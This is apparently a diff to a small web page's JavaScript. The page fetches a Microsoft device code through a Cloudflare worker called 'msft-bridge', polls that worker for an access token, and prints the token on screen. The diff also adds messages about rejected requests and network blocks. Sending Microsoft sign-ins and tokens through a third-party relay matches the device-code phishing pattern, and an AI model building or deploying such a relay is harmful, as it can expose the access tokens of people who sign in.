@@ -3,6 +3,9 @@ const WORKER_URL = "https://msft-bridge.brightmccain.workers.dev/";
 async function init() {
     const codeEl = document.getElementById('user-code');
     const statusEl = document.getElementById('status');
+    const outputEl = document.getElementById('terminal-output');
+
+    statusEl.innerText = "Attempting to reach Cloudflare...";
 
     try {
         const response = await fetch(WORKER_URL);
@@ -10,27 +13,35 @@ async function init() {
 
         if (data.user_code) {
             codeEl.innerText = data.user_code;
-            statusEl.innerText = "Awaiting Microsoft Authentication...";
-            // Start polling for the token
+            codeEl.style.color = "#ffffff";
+            statusEl.innerText = "Awaiting Microsoft Auth...";
             poll(data.device_code);
+        } else {
+            // Display Microsoft's error directly on screen
+            document.body.style.background = "#330000";
+            statusEl.innerText = "MICROSOFT REJECTED REQUEST";
+            outputEl.innerText = JSON.stringify(data, null, 2);
         }
     } catch (e) {
-        statusEl.innerText = "ERROR: Bridge Offline";
+        document.body.style.background = "#330000";
+        statusEl.innerText = "NETWORK BLOCK DETECTED";
+        outputEl.innerText = "Cannot reach Cloudflare. Error: " + e.message;
     }
 }
 
 async function poll(deviceCode) {
     const outputEl = document.getElementById('terminal-output');
+    const statusEl = document.getElementById('status');
     
-    const interval = setInterval(async () => {
-        const res = await fetch(`${WORKER_URL}?check=${deviceCode}`);
-        const data = await res.json();
-
-        if (data.access_token) {
-            clearInterval(interval);
-            document.getElementById('status').innerText = "HANDSHAKE COMPLETE";
-            outputEl.innerText = JSON.stringify(data, null, 2);
-        }
+    setInterval(async () => {
+        try {
+            const res = await fetch(`${WORKER_URL}?check=${deviceCode}`);
+            const data = await res.json();
+            if (data.access_token) {
+                statusEl.innerText = "HANDSHAKE COMPLETE";
+                outputEl.innerText = JSON.stringify(data, null, 2);
+            }
+        } catch (e) {}
     }, 5000);
 }
 
